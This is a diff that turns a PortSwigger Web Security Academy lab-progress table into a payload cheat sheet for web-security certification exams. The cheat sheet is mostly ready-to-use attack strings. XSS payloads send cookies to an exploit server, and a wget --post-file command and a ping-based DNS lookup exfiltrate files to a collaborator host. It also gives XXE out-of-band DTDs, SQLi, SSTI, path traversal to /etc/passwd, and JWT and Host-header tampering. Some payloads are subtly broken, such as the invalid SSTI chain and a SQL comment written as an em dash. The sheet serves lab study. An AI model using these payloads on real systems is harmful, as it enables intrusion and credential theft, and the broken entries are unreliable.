@@ -1,274 +1,125 @@
-# All Labs
+The sources provide numerous examples of payloads and techniques used in penetration testing, particularly those associated with the PortSwigger Web Security Academy labs and related certifications, falling into distinct vulnerability categories.
 
+Here is a comprehensive list of patterns and ready-to-use payloads, categorized by the vulnerability type they exploit, drawn directly from the source material:
 
-| Category | Solved | Not Solved | Total | Completion % |
-|----------|--------|------------|-------|--------------|
-| SQL injection | 9 | 7 | 16 | 56.3% |
-| Cross-site scripting | 16 | 0 | 16 | 100% |
-| CSRF | 11 | 0 | 11 | 100% |
-| Clickjacking | 0 | 4 | 4 | 0% |
-| DOM-based vulnerabilities | 5 | 0 | 5 | 100% |
-| CORS | 1 | 0 | 1 | 100% |
-| XXE injection | 6 | 0 | 6 | 100% |
-| SSRF | 3 | 0 | 3 | 100% |
-| HTTP request smuggling | 14 | 1 | 15 | 93.3% |
-| OS command injection | 4 | 0 | 4 | 100% |
-| Server-side template injection | 5 | 0 | 5 | 100% |
-| Path traversal | 5 | 0 | 5 | 100% |
-| Access control | 4 | 0 | 4 | 100% |
-| Authentication | 8 | 1 | 9 | 88.9% |
-| WebSockets | 0 | 2 | 2 | 0% |
-| Web cache poisoning | 9 | 0 | 9 | 100% |
-| Insecure deserialization | 5 | 1 | 6 | 83.3% |
-| Information disclosure | 0 | 1 | 1 | 0% |
-| Business logic | 2 | 5 | 7 | 28.6% |
-| HTTP Host header attacks | 4 | 0 | 4 | 100% |
-| OAuth authentication | 4 | 0 | 4 | 100% |
-| File upload vulnerabilities | 4 | 0 | 4 | 100% |
-| JWT | 4 | 0 | 4 | 100% |
-| Essential skills | 2 | 0 | 2 | 100% |
-| Prototype pollution | 0 | 9 | 9 | 0% |
-| GraphQL API | 4 | 0 | 4 | 100% |
-| Race conditions | 0 | 4 | 4 | 0% |
-| NoSQL injection | 0 | 2 | 2 | 0% |
-| API testing | 3 | 0 | 3 | 100% |
-| Web LLM attacks | 0 | 2 | 2 | 0% |
-| Web cache deception | 0 | 3 | 3 | 0% |
+---
 
-**SQL injection**
-- SQL injection attack, querying the database type and version on Oracle - Solved
-- SQL injection attack, querying the database type and version on MySQL and Microsoft - Solved
-- SQL injection attack, listing the database contents on non-Oracle databases - Solved
-- SQL injection attack, listing the database contents on Oracle - Solved
-- SQL injection UNION attack, determining the number of columns returned by the query - Solved
-- SQL injection UNION attack, finding a column containing text - Solved
-- SQL injection UNION attack, retrieving data from other tables - Solved
-- SQL injection UNION attack, retrieving multiple values in a single column - Solved
-- Blind SQL injection with conditional responses - Not solved
-- Blind SQL injection with conditional errors - Not solved
-- Visible error-based SQL injection - Not solved
-- Blind SQL injection with time delays - Solved
-- Blind SQL injection with time delays and information retrieval - Not solved
-- Blind SQL injection with out-of-band interaction - Not solved
-- Blind SQL injection with out-of-band data exfiltration - Not solved
-- SQL injection with filter bypass via XML encoding - Not solved
+### **Category 1: Cross-Site Scripting (XSS) Payloads**
 
-**Cross-site scripting**
-- DOM XSS in document.write sink using source location.search inside a select element - Solved
-- DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded - Solved
-- Reflected DOM XSS - Solved
-- Stored DOM XSS - Solved
-- Reflected XSS into HTML context with most tags and attributes blocked - Solved
-- Reflected XSS into HTML context with all tags blocked except custom ones - Solved
-- Reflected XSS with some SVG markup allowed - Solved
-- Reflected XSS in canonical link tag - Solved
-- Reflected XSS into a JavaScript string with single quote and backslash escaped - Solved
-- Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped - Solved
-- Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped - Solved
-- Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped - Solved
-- Exploiting cross-site scripting to steal cookies - Solved
-- Exploiting cross-site scripting to capture passwords - Solved
-- Exploiting XSS to bypass CSRF defenses - Solved
-- Reflected XSS protected by very strict CSP, with dangling markup attack - Solved
+These payloads are designed to execute arbitrary JavaScript, typically aimed at session theft (exfiltrating `document.cookie`).
 
-**Cross-site request forgery (CSRF)**
-- CSRF where token validation depends on request method - Solved
-- CSRF where token validation depends on token being present - Solved
-- CSRF where token is not tied to user session - Solved
-- CSRF where token is tied to non-session cookie - Solved
-- CSRF where token is duplicated in cookie - Solved
-- SameSite Lax bypass via method override - Solved
-- SameSite Strict bypass via client-side redirect - Solved
-- SameSite Strict bypass via sibling domain - Solved
-- SameSite Lax bypass via cookie refresh - Solved
-- CSRF where Referer validation depends on header being present - Solved
-- CSRF with broken Referer validation - Solved
+| Vulnerability Context | Description | Payload Example | Sources |
+| :--- | :--- | :--- | :--- |
+| **Reflected XSS (HTTP Smuggling via User-Agent)** | Injecting script into a header like `User-agent` when smuggling is possible. | `"><script>alert(document.cookie);var x=new XMLHttpRequest(); x.open("GET","https://[EXPLOIT-SERVER]/"+document.cookie);x.send();</script>` | |
+| **XSS in Search Bar (Filtered Tags/Attributes)** | Using allowed HTML tags and attributes (e.g., `<body onhashchange=>`) combined with base64 encoding to bypass filters and execute cookie stealing logic. | `<iframe src="[VULN_URL]/?query=%27%3Cbody%20onhashchange=%22eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZXhwbG9pdC1hYzQ0MWY0MDFlZjg2NTkxYzA4ZDFlZGMwMWNlMDBiYy53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQvP2M9Jytkb2N1bWVudC5jb29raWU'))%22%3E//" onload="this.onload='';this.src+='#XSS'"></iframe>` | |
+| **DOM XSS via Web Messages (JSON Parse Sink)** | Injecting a malicious `javascript:` URL into a controllable parameter (`redirectUrl`) delivered via a web message (`postMessage`). | `<iframe src=[VULN_URL] onload='this.contentWindow.postMessage("{\"type\":\"redirect\",\"redirectUrl\":\"javascript:window.location=%22https://[EXPLOIT-SERVER]/?c=%22%2bdocument.cookie\"}","*")'>` | |
+| **Filtered XSS Bypass (Mixed-case/Script Tag Closure)** | Bypassing filtering that blocks `<script>` by using mixed case tags and alternate event handlers (e.g., `onerror`). | **`</ScRiPt><ScRiPt>window["document"]["location"]="https://[EXPLOIT-SERVER]?"+window["document"]["cookie"]</ScRiPt>`** | |
+| **Reflected XSS (Basic Probe)** | Simple payload used to confirm reflection. | **`?searchterm="><script>alert%281%29<%2Fscript>`** | |
 
-**Clickjacking**
-- Clickjacking with form input data prefilled from a URL parameter - Not solved
-- Clickjacking with a frame buster script - Not solved
-- Exploiting clickjacking vulnerability to trigger DOM-based XSS - Not solved
-- Multistep clickjacking - Not solved
+---
 
-**DOM-based vulnerabilities**
-- DOM XSS using web messages - Solved
-- DOM XSS using web messages and a JavaScript URL - Solved
-- DOM XSS using web messages and JSON.parse - Solved
-- DOM-based open redirection - Solved
-- DOM-based cookie manipulation - Solved
+### **Category 2: Server-Side Injection Payloads**
 
-**CORS**
-- CORS vulnerability with trusted insecure protocols - Solved
+This category includes payloads for Server-Side Template Injection (SSTI), SQL Injection (SQLi), and OS Command Injection.
 
-**XXE injection**
-- Blind XXE with out-of-band interaction - Solved
-- Blind XXE with out-of-band interaction via XML parameter entities - Solved
-- Exploiting blind XXE to exfiltrate data using a malicious external DTD - Solved
-- Exploiting blind XXE to retrieve data via error messages - Solved
-- Exploiting XInclude to retrieve files - Solved
-- Exploiting XXE via image file upload - Solved
+#### **Server-Side Template Injection (SSTI)**
 
-**SSRF**
-- Blind SSRF with out-of-band detection - Solved
-- SSRF with blacklist-based input filter - Solved
-- SSRF with filter bypass via open redirection vulnerability - Solved
+| Attack Type | Goal | Payload Example | Sources |
+| :--- | :--- | :--- | :--- |
+| **SSTI (Python/Jinja2 equivalent)** | Reading a sensitive file (e.g., `/home/carlos/secret`). | **`{{ ''.__class__.__mro__.__subclasses__()('/home/carlos/secret').read() }}`** | |
 
-**HTTP request smuggling**
-- HTTP request smuggling, confirming a CL.TE vulnerability via differential responses - Solved
-- HTTP request smuggling, confirming a TE.CL vulnerability via differential responses - Solved
-- Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability - Solved
-- Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability - Solved
-- Exploiting HTTP request smuggling to reveal front-end request rewriting - Solved
-- Exploiting HTTP request smuggling to capture other users' requests - Solved
-- Exploiting HTTP request smuggling to deliver reflected XSS - Solved
-- Response queue poisoning via H2.TE request smuggling - Solved
-- H2.CL request smuggling - Solved
-- HTTP/2 request smuggling via CRLF injection - Solved
-- HTTP/2 request splitting via CRLF injection - Not solved
-- CL.0 request smuggling - Solved
-- HTTP request smuggling, basic CL.TE vulnerability - Solved
-- HTTP request smuggling, basic TE.CL vulnerability - Solved
-- HTTP request smuggling, obfuscating the TE header - Solved
+#### **SQL Injection (SQLi)**
 
-**OS command injection**
-- Blind OS command injection with time delays - Solved
-- Blind OS command injection with output redirection - Solved
-- Blind OS command injection with out-of-band interaction - Solved
-- Blind OS command injection with out-of-band data exfiltration - Solved
+| Attack Type | Context/Goal | Payload Example (PostgreSQL) | Sources |
+| :--- | :--- | :--- | :--- |
+| **Blind SQLi (Time Delay)** | Boolean condition testing for `administrator` password's first character (`a`), triggering a 10-second delay (`pg_sleep`). | **`query=testing^'))SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users—`** | |
+| **UNION Attack (Data Retrieval)** | Retrieving `username` and `password` columns from the `users` table (assuming 2 string columns found). | **`' UNION SELECT username, password FROM users--`** | |
+| **UNION Attack (Column Count)** | Probing column count using NULLs (example for 3 columns). | **`' UNION SELECT NULL,NULL,NULL--`** | |
+| **UNION Attack (Concatenation)** | Retrieving concatenated `username` and `password` in a single column (Oracle syntax shown). | **`' UNION SELECT username \|\| '~' \|\| password FROM users--`** | |
+| **Time-based Blind SQLi (MS SQL Server)** | Triggering a conditional 10-second time delay. | **`'; IF (1=1) WAITFOR DELAY '0:0:10'--`** | |
 
-**Server-side template injection**
-- Basic server-side template injection - Solved
-- Basic server-side template injection (code context) - Solved
-- Server-side template injection using documentation - Solved
-- Server-side template injection in an unknown language with a documented exploit - Solved
-- Server-side template injection with information disclosure via user-supplied objects - Solved
+#### **OS Command Injection**
 
-**Path traversal**
-- File path traversal, traversal sequences blocked with absolute path bypass - Solved
-- File path traversal, traversal sequences stripped non-recursively - Solved
-- File path traversal, traversal sequences stripped with superfluous URL-decode - Solved
-- File path traversal, validation of start of path - Solved
-- File path traversal, validation of file extension with null byte bypass - Solved
+| Attack Type | Context/Goal | Payload Example | Sources |
+| :--- | :--- | :--- | :--- |
+| **OOB Data Exfiltration (Image Size)** | Injecting command into an image size parameter using backticks to execute `wget` and post file contents to a collaborator server. | **`img-size="`/usr/bin/wget%20--post-file%20/home/carlos/secret%20https://[COLLAB-LINK]/`"`** | |
+| **OOB Data Exfiltration (XML Upload)** | Injecting command substitution (`$(cat /path/to/file)`) within a ping request to exfiltrate data via a DNS lookup to a collaborator server. | `<email>`0&amp;ping $(cat /home/carlos/secret ).[COLLABORATOR].net &amp;`</email>` | |
 
-**Access control**
-- URL-based access control can be circumvented - Solved
-- Method-based access control can be circumvented - Solved
-- Multi-step process with no access control on one step - Solved
-- Referer-based access control - Solved
+---
 
-**Authentication**
-- Username enumeration via subtly different responses - Solved
-- Username enumeration via response timing - Solved
-- Broken brute-force protection, IP block - Not solved
-- Username enumeration via account lock - Solved
-- 2FA broken logic - Solved
-- Brute-forcing a stay-logged-in cookie - Solved
-- Offline password cracking - Solved
-- Password reset poisoning via middleware - Solved
-- Password brute-force via password change - Solved
+### **Category 3: Data Retrieval and File Access Payloads**
 
-**WebSockets**
-- Cross-site WebSocket hijacking - Not solved
-- Manipulating the WebSocket handshake to exploit vulnerabilities - Not solved
+This covers Local File Inclusion (LFI) and XML External Entity (XXE) attacks.
 
-**Web cache poisoning**
-- Web cache poisoning with an unkeyed header - Solved
-- Web cache poisoning with an unkeyed cookie - Solved
-- Web cache poisoning with multiple headers - Solved
-- Targeted web cache poisoning using an unknown header - Solved
-- Web cache poisoning via an unkeyed query string - Solved
-- Web cache poisoning via an unkeyed query parameter - Solved
-- Parameter cloaking - Solved
-- Web cache poisoning via a fat GET request - Solved
-- URL normalization - Solved
+#### **Local File Inclusion (LFI) / Directory Traversal**
 
-**Insecure deserialization**
-- Modifying serialized data types - Solved
-- Using application functionality to exploit insecure deserialization - Solved
-- Arbitrary object injection in PHP - Solved
-- Exploiting Java deserialization with Apache Commons - Solved
-- Exploiting PHP deserialization with a pre-built gadget chain - Solved
-- Exploiting Ruby deserialization using a documented gadget chain - Not solved
+| Attack Type | Goal | Payload Example (Double URL Encoded Path Traversal) | Sources |
+| :--- | :--- | :--- | :--- |
+| **LFI/Directory Traversal** | Accessing sensitive system files like `/etc/passwd`. | **`/admin/adminimg?imagefile=..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd`** | |
+| **LFI/Directory Traversal** | Accessing the process environment variables. | `/admin/adminimg?imagefile=..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/proc/self/environ` | |
 
-**Information disclosure**
-- Information disclosure in version control history - Not solved
+#### **XML External Entity (XXE)**
 
-**Business logic vulnerabilities**
-- Low-level logic flaw - Not solved
-- Inconsistent handling of exceptional input - Not solved
-- Weak isolation on dual-use endpoint - Solved
-- Insufficient workflow validation - Not solved
-- Authentication bypass via flawed state machine - Solved
-- Infinite money logic flaw - Not solved
-- Authentication bypass via encryption oracle - Not solved
+| Attack Type | Context/Goal | Payload Example (OOB Data Exfiltration) | Sources |
+| :--- | :--- | :--- | :--- |
+| **Malicious XML File Content** | Points the `xxe` entity to an external DTD hosted on the exploit server. | **`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://[EXPLOIT-SERVER]/exploit.dtd"> %xxe; ]> <users>... <username>&xxe;</username> ...</users>`** | |
+| **External DTD Content (Exploit Server)** | Uses file entity to read target file and then exfiltrates it via an OOB network request to a collaborator. | **`<!ENTITY % file SYSTEM "file:///home/carlos/secret"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://[COLLABORATOR].net/?x=%file;'>"> %eval; %exfil;`** | |
 
-**HTTP Host header attacks**
-- Web cache poisoning via ambiguous requests - Solved
-- Routing-based SSRF - Solved
-- SSRF via flawed request parsing - Solved
-- Host validation bypass via connection state attack - Solved
+---
 
-**OAuth authentication**
-- SSRF via OpenID dynamic client registration - Solved
-- Forced OAuth profile linking - Solved
-- OAuth account hijacking via redirect_uri - Solved
-- Stealing OAuth access tokens via an open redirect - Solved
+### **Category 4: Authorization and Authentication Payloads**
 
-**File upload vulnerabilities**
-- Web shell upload via path traversal - Solved
-- Web shell upload via extension blacklist bypass - Solved
-- Web shell upload via obfuscated file extension - Solved
-- Remote code execution via polyglot web shell upload - Solved
+This category includes techniques for JWT manipulation, access control bypass (IDOR), and CSRF token bypass.
 
-**JWT**
-- JWT authentication bypass via weak signing key - Solved
-- JWT authentication bypass via jwk header injection - Solved
-- JWT authentication bypass via jku header injection - Solved
-- JWT authentication bypass via kid header path traversal - Solved
+#### **JSON Web Token (JWT) Attacks**
 
-**Essential skills**
-- Discovering vulnerabilities quickly with targeted scanning - Solved
-- Scanning non-standard data structures - Solved
+| Attack Type | Context/Goal | Payload Example (Injection Point) | Sources |
+| :--- | :--- | :--- | :--- |
+| **Algorithm Confusion** | Modify header to use symmetric algorithm (`HS256`) when the server expects asymmetric (`RS256`), then sign the token using the server's public key as the secret. | **Header: `{ "alg": "HS256", "typ": "JWT" }`** | |
+| **Accepting No Signature** | Setting the algorithm to `none` (sometimes requiring obfuscation like mixed case) to skip verification. | **Header: `{ "alg": "none", "typ": "JWT" }`** | |
+| **`kid` Parameter (Path Traversal)** | Injecting path traversal sequence in the `kid` header to force the server to use a static file (like `/dev/null`) as the verification key. | **Header: `{ "kid": "../../path/to/file", "typ": "JWT", "alg": "HS256", ... }`** | |
+| **`jwk` Parameter Injection** | Embedding an attacker's own public key in the token header for verification. | **Header: `{ "alg": "RS256", "jwk": { "kty": "RSA", "e": "AQAB", ... }, ... }`** (Requires tool support like Burp JWT Editor extension) | |
 
-**Prototype pollution**
-- Client-side prototype pollution via browser APIs - Not solved
-- DOM XSS via client-side prototype pollution - Not solved
-- DOM XSS via an alternative prototype pollution vector - Not solved
-- Client-side prototype pollution via flawed sanitization - Not solved
-- Client-side prototype pollution in third-party libraries - Not solved
-- Privilege escalation via server-side prototype pollution - Not solved
-- Detecting server-side prototype pollution without polluted property reflection - Not solved
-- Bypassing flawed input filters for server-side prototype pollution - Not solved
-- Remote code execution via server-side prototype pollution - Not solved
+#### **Access Control and IDOR**
 
-**GraphQL API vulnerabilities**
-- Accidental exposure of private GraphQL fields - Solved
-- Finding a hidden GraphQL endpoint - Solved
-- Bypassing GraphQL brute force protections - Solved
-- Performing CSRF exploits over GraphQL - Solved
+| Attack Type | Goal | Payload/Technique | Sources |
+| :--- | :--- | :--- | :--- |
+| **IDOR / Role Modification** | Finding and manipulating a hidden parameter (`roleid`) in a request (e.g., Change Email request) to escalate privileges. | **JSON Body Injection:** Add or modify parameter: `"roleid": [NUMBER]` (Brute force range to find administrator's ID) | |
 
-**Race conditions**
-- Bypassing rate limits via race conditions - Not solved
-- Multi-endpoint race conditions - Not solved
-- Single-endpoint race conditions - Not solved
-- Exploiting time-sensitive vulnerabilities - Not solved
+#### **CSRF/Session Bypass**
 
-**NoSQL injection**
-- Exploiting NoSQL injection to extract data - Not solved
-- Exploiting NoSQL operator injection to extract unknown fields - Not solved
+| Attack Type | Goal | Payload/Technique | Sources |
+| :--- | :--- | :--- | :--- |
+| **CSRF Token Not Tied to Session** | Obtaining a valid CSRF token and session cookie from one user (e.g., Carlos) and substituting them into a critical request (e.g., password reset or profile change) for a target user (e.g., administrator). | **Cookie/CSRF Exchange:** Intercept the target's request (e.g., password request for administrator), then exchange the cookie and CSRF token with a valid set obtained from an attacker-controlled session. | |
 
-**API testing**
-- Exploiting server-side parameter pollution in a query string - Solved
-- Finding and exploiting an unused API endpoint - Solved
-- Exploiting a mass assignment vulnerability - Solved
+---
 
-**Web LLM attacks**
-- Exploiting vulnerabilities in LLM APIs - Not solved
-- Indirect prompt injection - Not solved
+### **Category 5: Web Cache and HTTP Header Manipulation**
 
-**Web cache deception**
-- Exploiting path delimiters for web cache deception - Not solved
-- Exploiting origin server normalization for web cache deception - Not solved
-- Exploiting cache server normalization for web cache deception - Not solved
+These payloads exploit intermediaries like caches, load balancers, and reverse proxies.
 
+| Attack Type | Context/Goal | Payload Example | Sources |
+| :--- | :--- | :--- | :--- |
+| **Password Reset Poisoning** | Using a forged header to poison the password reset link sent by the server. | **Header Injection:** `X-Forwarded-Host: [YOUR-EXPLOIT-SERVER]` | |
+| **Web Cache Poisoning (Resource Import)** | Poisoning the cache to serve malicious JavaScript by manipulating the dynamically generated resource URL. | **Header Injection (Poisoning Key):** `X-Forwarded-Host: [EXPLOIT-SERVER-DOMAIN]` | |
+| **HTTP Host Header Validation Bypass** | Bypassing validation that omits the port by supplying a non-numeric port payload. | **Header Injection:** `Host: vulnerable-website.com:bad-stuff-here` | |
+| **Host Override Headers** | Injecting host value via alternate headers if the main `Host` header is checked. | **Header Injection:** `X-Forwarded-Host: bad-stuff-here` (Also includes `X-Host`, `Forwarded`, etc.) | |
+| **CSRF Referer Bypass (Omission)** | Omitting the `Referer` header to bypass checks when validation depends on the header being present. | **HTML META Tag:** `<meta name="referrer" content="never">` | |
 
+---
+
+### **The Exam Pattern: Categories and Goal Payloads**
+
+The patterns observed across these examples focus on achieving high-impact goals through specific attack chains:
+
+1.  **Privilege Escalation/Session Hijack:** Achieved by tampering with cookies, JWT claims, or hidden parameters (`roleid`).
+2.  **Information Retrieval/Discovery:** Achieved using injections (SSTI, SQLi, XXE) to read files (`/home/carlos/secret`), extract database credentials, or enumerate users.
+3.  **Client-Side Compromise/Cookie Theft:** Achieved using XSS payloads delivered via cache poisoning, DOM manipulation, or request smuggling.
+
+When approaching an "exam" setting, these examples highlight the necessity of testing various inputs (parameters, headers, file contents, JSON/XML bodies) with payloads tailored for:
+
+*   **Header Manipulation:** `Host`, `X-Forwarded-Host`, `X-Forwarded-For`, `User-Agent`.
+*   **Authentication Tokens:** Modifying JWT headers (`alg`, `kid`, `jwk`) or brute-forcing session IDs/parameters (`roleid`).
+*   **Encoding:** Using double URL encoding or Base64 encoding to bypass filters for XSS or LFI/XXE payloads.
+
+You can think of these exploit chains like a key and lock system: **Input Source** (e.g., query string, cookie, header) **+ Vulnerable Sink/Function** (e.g., database query, HTML reflection, template engine) **= Goal Payload**. Your task is often to find the correct format that allows the data from the source to reach the sink without being sanitized.
